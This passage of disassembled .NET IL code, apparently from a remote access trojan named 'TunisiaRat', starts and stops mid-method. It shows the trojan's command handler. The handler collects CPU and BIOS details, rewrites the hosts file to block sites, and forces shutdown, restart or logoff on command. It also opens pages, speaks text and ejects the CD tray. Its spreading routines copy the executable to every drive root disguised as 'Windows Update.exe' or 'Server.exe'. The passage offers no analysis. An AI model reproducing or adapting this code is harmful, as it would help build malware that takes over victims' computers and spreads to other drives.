      IL_10c3:  rem
      IL_10c4:  conv.r8
      IL_10c5:  ldc.r8     1000.
      IL_10ce:  div
      IL_10cf:  call       float64 [mscorlib]System.Math::Round(float64)
      IL_10d4:  conv.ovf.i4
      IL_10d5:  stloc.s    V_51
      IL_10d7:  ldstr      "HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\Cen"
      + "tralProcessor\\0"
      IL_10dc:  ldstr      "ProcessorNameString"
      IL_10e1:  ldstr      ""
      IL_10e6:  call       object [mscorlib]Microsoft.Win32.Registry::GetValue(string,
                                                                               string,
                                                                               object)
      IL_10eb:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_10f0:  stloc.s    V_42
      IL_10f2:  ldstr      "HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\Cen"
      + "tralProcessor\\0"
      IL_10f7:  ldstr      "Identifier"
      IL_10fc:  ldstr      ""
      IL_1101:  call       object [mscorlib]Microsoft.Win32.Registry::GetValue(string,
                                                                               string,
                                                                               object)
      IL_1106:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_110b:  stloc.s    V_43
      IL_110d:  ldstr      "HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS"
      IL_1112:  ldstr      "SystemProductName"
      IL_1117:  ldstr      ""
      IL_111c:  call       object [mscorlib]Microsoft.Win32.Registry::GetValue(string,
                                                                               string,
                                                                               object)
      IL_1121:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_1126:  stloc.s    V_44
      IL_1128:  ldstr      "HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS"
      IL_112d:  ldstr      "BIOSReleaseDate"
      IL_1132:  ldstr      ""
      IL_1137:  call       object [mscorlib]Microsoft.Win32.Registry::GetValue(string,
                                                                               string,
                                                                               object)
      IL_113c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_1141:  stloc.s    V_45
      IL_1143:  ldstr      "HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS"
      IL_1148:  ldstr      "BIOSVersion"
      IL_114d:  ldstr      ""
      IL_1152:  call       object [mscorlib]Microsoft.Win32.Registry::GetValue(string,
                                                                               string,
                                                                               object)
      IL_1157:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_115c:  stloc.s    V_46
      IL_115e:  ldstr      "HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS"
      IL_1163:  ldstr      "SystemManufacturer"
      IL_1168:  ldstr      ""
      IL_116d:  call       object [mscorlib]Microsoft.Win32.Registry::GetValue(string,
                                                                               string,
                                                                               object)
      IL_1172:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_1177:  stloc.s    V_47
      IL_1179:  ldstr      "HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS"
      IL_117e:  ldstr      "BIOSVendor"
      IL_1183:  ldstr      ""
      IL_1188:  call       object [mscorlib]Microsoft.Win32.Registry::GetValue(string,
                                                                               string,
                                                                               object)
      IL_118d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_1192:  stloc.s    V_48
      IL_1194:  ldstr      "HKEY_CURRENT_USER\\TunisiaRat"
      IL_1199:  ldstr      "ID"
      IL_119e:  ldstr      ""
      IL_11a3:  call       object [mscorlib]Microsoft.Win32.Registry::GetValue(string,
                                                                               string,
                                                                               object)
      IL_11a8:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_11ad:  stloc.s    V_53
      IL_11af:  br         IL_17d9

      IL_11b4:  nop
      IL_11b5:  ldloc.s    V_107
      IL_11b7:  ldstr      "BlocKPage"
      IL_11bc:  ldc.i4.0
      IL_11bd:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_11c2:  ldc.i4.0
      IL_11c3:  ceq
      IL_11c5:  stloc.s    V_138
      IL_11c7:  ldloc.s    V_138
      IL_11c9:  brfalse.s  IL_11f4

      IL_11cb:  nop
      IL_11cc:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_11d1:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
      IL_11d6:  ldstr      "C:\\WINDOWS\\system32\\drivers\\etc\\hosts"
      IL_11db:  ldstr      "\r\n127.0.0.1  "
      IL_11e0:  ldloc.0
      IL_11e1:  ldc.i4.1
      IL_11e2:  ldelem.ref
      IL_11e3:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_11e8:  ldc.i4.1
      IL_11e9:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::WriteAllText(string,
                                                                                                                               string,
                                                                                                                               bool)
      IL_11ee:  nop
      IL_11ef:  br         IL_17d9

      IL_11f4:  nop
      IL_11f5:  ldloc.s    V_107
      IL_11f7:  ldstr      "Restart"
      IL_11fc:  ldc.i4.0
      IL_11fd:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1202:  ldc.i4.0
      IL_1203:  ceq
      IL_1205:  stloc.s    V_138
      IL_1207:  ldloc.s    V_138
      IL_1209:  brfalse.s  IL_121f

      IL_120b:  nop
      IL_120c:  ldstr      "shutdown -r -t 00"
      IL_1211:  ldc.i4.0
      IL_1212:  ldc.i4.0
      IL_1213:  ldc.i4.m1
      IL_1214:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_1219:  pop
      IL_121a:  br         IL_17d9

      IL_121f:  nop
      IL_1220:  ldloc.s    V_107
      IL_1222:  ldstr      "Shutdown"
      IL_1227:  ldc.i4.0
      IL_1228:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_122d:  ldc.i4.0
      IL_122e:  ceq
      IL_1230:  stloc.s    V_138
      IL_1232:  ldloc.s    V_138
      IL_1234:  brfalse.s  IL_124a

      IL_1236:  nop
      IL_1237:  ldstr      "shutdown -s -t 00"
      IL_123c:  ldc.i4.0
      IL_123d:  ldc.i4.0
      IL_123e:  ldc.i4.m1
      IL_123f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_1244:  pop
      IL_1245:  br         IL_17d9

      IL_124a:  nop
      IL_124b:  ldloc.s    V_107
      IL_124d:  ldstr      "logoff"
      IL_1252:  ldc.i4.0
      IL_1253:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1258:  ldc.i4.0
      IL_1259:  ceq
      IL_125b:  stloc.s    V_138
      IL_125d:  ldloc.s    V_138
      IL_125f:  brfalse.s  IL_1275

      IL_1261:  nop
      IL_1262:  ldstr      "shutdown -l -t 00"
      IL_1267:  ldc.i4.0
      IL_1268:  ldc.i4.0
      IL_1269:  ldc.i4.m1
      IL_126a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_126f:  pop
      IL_1270:  br         IL_17d9

      IL_1275:  nop
      IL_1276:  ldloc.s    V_107
      IL_1278:  ldstr      "OpenPage"
      IL_127d:  ldc.i4.0
      IL_127e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1283:  ldc.i4.0
      IL_1284:  ceq
      IL_1286:  stloc.s    V_138
      IL_1288:  ldloc.s    V_138
      IL_128a:  brfalse.s  IL_129b

      IL_128c:  nop
      IL_128d:  ldloc.0
      IL_128e:  ldc.i4.1
      IL_128f:  ldelem.ref
      IL_1290:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_1295:  pop
      IL_1296:  br         IL_17d9

      IL_129b:  nop
      IL_129c:  ldloc.s    V_107
      IL_129e:  ldstr      "TextToSpeech"
      IL_12a3:  ldc.i4.0
      IL_12a4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_12a9:  ldc.i4.0
      IL_12aa:  ceq
      IL_12ac:  stloc.s    V_138
      IL_12ae:  ldloc.s    V_138
      IL_12b0:  brfalse    IL_1338

      IL_12b5:  nop
      IL_12b6:  ldstr      "SAPI.Spvoice"
      IL_12bb:  ldstr      ""
      IL_12c0:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::CreateObject(string,
                                                                                                         string)
      IL_12c5:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_12ca:  stloc.s    V_54
      IL_12cc:  ldloc.s    V_54
      IL_12ce:  ldnull
      IL_12cf:  ldstr      "speak"
      IL_12d4:  ldc.i4.1
      IL_12d5:  newarr     [mscorlib]System.Object
      IL_12da:  stloc.s    V_111
      IL_12dc:  ldloc.s    V_111
      IL_12de:  ldc.i4.0
      IL_12df:  ldloc.0
      IL_12e0:  stloc.s    V_108
      IL_12e2:  ldloc.s    V_108
      IL_12e4:  ldc.i4.1
      IL_12e5:  stloc.s    V_109
      IL_12e7:  ldloc.s    V_109
      IL_12e9:  ldelem.ref
      IL_12ea:  stelem.ref
      IL_12eb:  nop
      IL_12ec:  ldloc.s    V_111
      IL_12ee:  stloc.s    V_110
      IL_12f0:  ldloc.s    V_110
      IL_12f2:  ldnull
      IL_12f3:  ldnull
      IL_12f4:  ldc.i4.1
      IL_12f5:  newarr     [mscorlib]System.Boolean
      IL_12fa:  stloc.s    V_112
      IL_12fc:  ldloc.s    V_112
      IL_12fe:  ldc.i4.0
      IL_12ff:  ldc.i4.1
      IL_1300:  stelem.i1
      IL_1301:  ldloc.s    V_112
      IL_1303:  ldc.i4.1
      IL_1304:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_1309:  pop
      IL_130a:  ldloc.s    V_112
      IL_130c:  ldc.i4.0
      IL_130d:  ldelem.i1
      IL_130e:  brfalse.s  IL_1333

      IL_1310:  ldloc.s    V_108
      IL_1312:  ldloc.s    V_109
      IL_1314:  ldloc.s    V_110
      IL_1316:  ldc.i4.0
      IL_1317:  ldelem.ref
      IL_1318:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_131d:  ldtoken    [mscorlib]System.String
      IL_1322:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_1327:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_132c:  castclass  [mscorlib]System.String
      IL_1331:  stelem.ref
      IL_1332:  nop
      IL_1333:  br         IL_17d9

      IL_1338:  nop
      IL_1339:  ldloc.s    V_107
      IL_133b:  ldstr      "opencd"
      IL_1340:  ldc.i4.0
      IL_1341:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1346:  ldc.i4.0
      IL_1347:  ceq
      IL_1349:  stloc.s    V_138
      IL_134b:  ldloc.s    V_138
      IL_134d:  brfalse.s  IL_1372

      IL_134f:  nop
      IL_1350:  ldstr      "set cdaudio door open"
      IL_1355:  stloc.s    V_123
      IL_1357:  ldloca.s   V_123
      IL_1359:  ldc.i4.0
      IL_135a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_135f:  stloc.s    V_122
      IL_1361:  ldloca.s   V_122
      IL_1363:  ldc.i4.0
      IL_1364:  conv.i8
      IL_1365:  ldc.i4.0
      IL_1366:  conv.i8
      IL_1367:  call       int64 j.OK::mciSendString(string&,
                                                     string&,
                                                     int64,
                                                     int64)
      IL_136c:  pop
      IL_136d:  br         IL_17d9

      IL_1372:  nop
      IL_1373:  ldloc.s    V_107
      IL_1375:  ldstr      "closecd"
      IL_137a:  ldc.i4.0
      IL_137b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1380:  ldc.i4.0
      IL_1381:  ceq
      IL_1383:  stloc.s    V_138
      IL_1385:  ldloc.s    V_138
      IL_1387:  brfalse.s  IL_13ac

      IL_1389:  nop
      IL_138a:  ldstr      "set cdaudio door closed"
      IL_138f:  stloc.s    V_123
      IL_1391:  ldloca.s   V_123
      IL_1393:  ldc.i4.0
      IL_1394:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_1399:  stloc.s    V_122
      IL_139b:  ldloca.s   V_122
      IL_139d:  ldc.i4.0
      IL_139e:  conv.i8
      IL_139f:  ldc.i4.0
      IL_13a0:  conv.i8
      IL_13a1:  call       int64 j.OK::mciSendString(string&,
                                                     string&,
                                                     int64,
                                                     int64)
      IL_13a6:  pop
      IL_13a7:  br         IL_17d9

      IL_13ac:  nop
      IL_13ad:  ldloc.s    V_107
      IL_13af:  ldstr      "Msgboxerr"
      IL_13b4:  ldc.i4.0
      IL_13b5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_13ba:  ldc.i4.0
      IL_13bb:  ceq
      IL_13bd:  stloc.s    V_138
      IL_13bf:  ldloc.s    V_138
      IL_13c1:  brfalse.s  IL_13d9

      IL_13c3:  nop
      IL_13c4:  ldloc.0
      IL_13c5:  ldc.i4.1
      IL_13c6:  ldelem.ref
      IL_13c7:  ldc.i4.s   16
      IL_13c9:  ldstr      "Computer"
      IL_13ce:  call       valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxResult [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::MsgBox(object,
                                                                                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxStyle,
                                                                                                                                                                object)
      IL_13d3:  pop
      IL_13d4:  br         IL_17d9

      IL_13d9:  nop
      IL_13da:  ldloc.s    V_107
      IL_13dc:  ldstr      "Msgboxinfo"
      IL_13e1:  ldc.i4.0
      IL_13e2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_13e7:  ldc.i4.0
      IL_13e8:  ceq
      IL_13ea:  stloc.s    V_138
      IL_13ec:  ldloc.s    V_138
      IL_13ee:  brfalse.s  IL_1406

      IL_13f0:  nop
      IL_13f1:  ldloc.0
      IL_13f2:  ldc.i4.1
      IL_13f3:  ldelem.ref
      IL_13f4:  ldc.i4.s   64
      IL_13f6:  ldstr      "Computer"
      IL_13fb:  call       valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxResult [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::MsgBox(object,
                                                                                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxStyle,
                                                                                                                                                                object)
      IL_1400:  pop
      IL_1401:  br         IL_17d9

      IL_1406:  nop
      IL_1407:  ldloc.s    V_107
      IL_1409:  ldstr      "MsgboxQ"
      IL_140e:  ldc.i4.0
      IL_140f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1414:  ldc.i4.0
      IL_1415:  ceq
      IL_1417:  stloc.s    V_138
      IL_1419:  ldloc.s    V_138
      IL_141b:  brfalse.s  IL_1433

      IL_141d:  nop
      IL_141e:  ldloc.0
      IL_141f:  ldc.i4.1
      IL_1420:  ldelem.ref
      IL_1421:  ldc.i4.s   32
      IL_1423:  ldstr      "Computer"
      IL_1428:  call       valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxResult [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::MsgBox(object,
                                                                                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxStyle,
                                                                                                                                                                object)
      IL_142d:  pop
      IL_142e:  br         IL_17d9

      IL_1433:  nop
      IL_1434:  ldloc.s    V_107
      IL_1436:  ldstr      "MsgboxExl"
      IL_143b:  ldc.i4.0
      IL_143c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1441:  ldc.i4.0
      IL_1442:  ceq
      IL_1444:  stloc.s    V_138
      IL_1446:  ldloc.s    V_138
      IL_1448:  brfalse.s  IL_1460

      IL_144a:  nop
      IL_144b:  ldloc.0
      IL_144c:  ldc.i4.1
      IL_144d:  ldelem.ref
      IL_144e:  ldc.i4.s   48
      IL_1450:  ldstr      "Computer"
      IL_1455:  call       valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxResult [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::MsgBox(object,
                                                                                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxStyle,
                                                                                                                                                                object)
      IL_145a:  pop
      IL_145b:  br         IL_17d9

      IL_1460:  nop
      IL_1461:  ldloc.s    V_107
      IL_1463:  ldstr      "spreading"
      IL_1468:  ldc.i4.0
      IL_1469:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_146e:  ldc.i4.0
      IL_146f:  ceq
      IL_1471:  stloc.s    V_138
      IL_1473:  ldloc.s    V_138
      IL_1475:  brfalse    IL_1500

      IL_147a:  nop
      IL_147b:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_1480:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
      IL_1485:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
      IL_148a:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_ProgramFiles()
      IL_148f:  stloc.s    V_56
      IL_1491:  call       string[] [mscorlib]System.IO.Directory::GetLogicalDrives()
      IL_1496:  stloc.s    V_55
      IL_1498:  ldloc.s    V_55
      IL_149a:  stloc.s    V_125
      IL_149c:  ldc.i4.0
      IL_149d:  stloc.s    V_124
      IL_149f:  br.s       IL_14ed

      IL_14a1:  ldloc.s    V_125
      IL_14a3:  ldloc.s    V_124
      IL_14a5:  ldelem.ref
      IL_14a6:  stloc.s    V_56
      IL_14a8:  nop
      .try
      {
        IL_14a9:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
        IL_14ae:  ldloc.s    V_56
        IL_14b0:  ldloc.0
        IL_14b1:  ldc.i4.1
        IL_14b2:  ldelem.ref
        IL_14b3:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_14b8:  call       void [mscorlib]System.IO.File::Copy(string,
                                                                 string)
        IL_14bd:  nop
        IL_14be:  ldloc.s    V_56
        IL_14c0:  ldloc.0
        IL_14c1:  ldc.i4.1
        IL_14c2:  ldelem.ref
        IL_14c3:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_14c8:  ldc.i4     0x80
        IL_14cd:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                          valuetype [mscorlib]System.IO.FileAttributes)
        IL_14d2:  nop
        IL_14d3:  leave.s    IL_14e5

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_14d5:  dup
        IL_14d6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_14db:  stloc.s    V_57
        IL_14dd:  nop
        IL_14de:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_14e3:  leave.s    IL_14e5

      }  // end handler
      IL_14e5:  nop
      IL_14e6:  ldloc.s    V_124
      IL_14e8:  ldc.i4.1
      IL_14e9:  add.ovf
      IL_14ea:  stloc.s    V_124
      IL_14ec:  nop
      IL_14ed:  ldloc.s    V_124
      IL_14ef:  ldloc.s    V_125
      IL_14f1:  ldlen
      IL_14f2:  conv.ovf.i4
      IL_14f3:  clt
      IL_14f5:  stloc.s    V_138
      IL_14f7:  ldloc.s    V_138
      IL_14f9:  brtrue.s   IL_14a1

      IL_14fb:  br         IL_17d9

      IL_1500:  nop
      IL_1501:  ldloc.s    V_107
      IL_1503:  ldstr      "ll"
      IL_1508:  ldc.i4.0
      IL_1509:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_150e:  ldc.i4.0
      IL_150f:  ceq
      IL_1511:  stloc.s    V_138
      IL_1513:  ldloc.s    V_138
      IL_1515:  brfalse.s  IL_1529

      IL_1517:  nop
      IL_1518:  ldc.i4.0
      IL_1519:  stsfld     bool j.OK::Cn
      IL_151e:  nop
      IL_151f:  leave      IL_25af

      IL_1524:  br         IL_17d9

      IL_1529:  nop
      IL_152a:  ldloc.s    V_107
      IL_152c:  ldstr      "spreading"
      IL_1531:  ldc.i4.0
      IL_1532:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1537:  ldc.i4.0
      IL_1538:  ceq
      IL_153a:  stloc.s    V_138
      IL_153c:  ldloc.s    V_138
      IL_153e:  brfalse    IL_160a

      IL_1543:  nop
      IL_1544:  nop
      .try
      {
        IL_1545:  call       class [mscorlib]System.IO.DriveInfo[] [mscorlib]System.IO.DriveInfo::GetDrives()
        IL_154a:  stloc.s    V_58
        IL_154c:  ldloc.s    V_58
        IL_154e:  stloc.s    V_127
        IL_1550:  ldc.i4.0
        IL_1551:  stloc.s    V_126
        IL_1553:  br         IL_15e1

        IL_1558:  ldloc.s    V_127
        IL_155a:  ldloc.s    V_126
        IL_155c:  ldelem.ref
        IL_155d:  stloc.s    V_59
        IL_155f:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
        IL_1564:  nop
        IL_1565:  ldc.i4.s   10
        IL_1567:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_156c:  nop
        IL_156d:  ldloc.s    V_59
        IL_156f:  callvirt   instance bool [mscorlib]System.IO.DriveInfo::get_IsReady()
        IL_1574:  stloc.s    V_138
        IL_1576:  ldloc.s    V_138
        IL_1578:  brfalse.s  IL_15d9

        IL_157a:  call       object j.OK::get_NomeSpreadDiscoLocal()
        IL_157f:  ldnull
        IL_1580:  ldc.i4.0
        IL_1581:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                         object,
                                                                                                                                         bool)
        IL_1586:  stloc.s    V_137
        IL_1588:  ldloc.s    V_137
        IL_158a:  brfalse.s  IL_15b0

        IL_158c:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
        IL_1591:  ldloc.s    V_59
        IL_1593:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DriveInfo::get_RootDirectory()
        IL_1598:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_159d:  ldstr      "Windows Update.exe"
        IL_15a2:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_15a7:  ldc.i4.1
        IL_15a8:  call       void [mscorlib]System.IO.File::Copy(string,
                                                                 string,
                                                                 bool)
        IL_15ad:  nop
        IL_15ae:  br.s       IL_15d8

        IL_15b0:  nop
        IL_15b1:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
        IL_15b6:  ldloc.s    V_59
        IL_15b8:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DriveInfo::get_RootDirectory()
        IL_15bd:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_15c2:  call       object j.OK::get_NomeSpreadDiscoLocal()
        IL_15c7:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                               object)
        IL_15cc:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
        IL_15d1:  ldc.i4.1
        IL_15d2:  call       void [mscorlib]System.IO.File::Copy(string,
                                                                 string,
                                                                 bool)
        IL_15d7:  nop
        IL_15d8:  nop
        IL_15d9:  nop
        IL_15da:  ldloc.s    V_126
        IL_15dc:  ldc.i4.1
        IL_15dd:  add.ovf
        IL_15de:  stloc.s    V_126
        IL_15e0:  nop
        IL_15e1:  ldloc.s    V_126
        IL_15e3:  ldloc.s    V_127
        IL_15e5:  ldlen
        IL_15e6:  conv.ovf.i4
        IL_15e7:  clt
        IL_15e9:  stloc.s    V_138
        IL_15eb:  ldloc.s    V_138
        IL_15ed:  brtrue     IL_1558

        IL_15f2:  leave.s    IL_1604

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_15f4:  dup
        IL_15f5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_15fa:  stloc.s    V_60
        IL_15fc:  nop
        IL_15fd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1602:  leave.s    IL_1604

      }  // end handler
      IL_1604:  nop
      IL_1605:  br         IL_17d9

      IL_160a:  nop
      IL_160b:  ldloc.s    V_107
      IL_160d:  ldstr      "spreadingg"
      IL_1612:  ldc.i4.0
      IL_1613:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1618:  ldc.i4.0
      IL_1619:  ceq
      IL_161b:  stloc.s    V_138
      IL_161d:  ldloc.s    V_138
      IL_161f:  brfalse    IL_16ae

      IL_1624:  nop
      IL_1625:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_162a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
      IL_162f:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
      IL_1634:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_ProgramFiles()
      IL_1639:  stloc.s    V_62
      IL_163b:  call       string[] [mscorlib]System.IO.Directory::GetLogicalDrives()
      IL_1640:  stloc.s    V_61
      IL_1642:  ldloc.s    V_61
      IL_1644:  stloc.s    V_129
      IL_1646:  ldc.i4.0
      IL_1647:  stloc.s    V_128
      IL_1649:  br.s       IL_169b

      IL_164b:  ldloc.s    V_129
      IL_164d:  ldloc.s    V_128
      IL_164f:  ldelem.ref
      IL_1650:  stloc.s    V_62
      IL_1652:  nop
      .try
      {
        IL_1653:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
        IL_1658:  ldloc.s    V_62
        IL_165a:  ldstr      "Server.exe"
        IL_165f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_1664:  call       void [mscorlib]System.IO.File::Copy(string,
                                                                 string)
        IL_1669:  nop
        IL_166a:  ldloc.s    V_62
        IL_166c:  ldstr      "Server.exe"
        IL_1671:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_1676:  ldc.i4     0x80
        IL_167b:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                          valuetype [mscorlib]System.IO.FileAttributes)
        IL_1680:  nop
        IL_1681:  leave.s    IL_1693

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1683:  dup
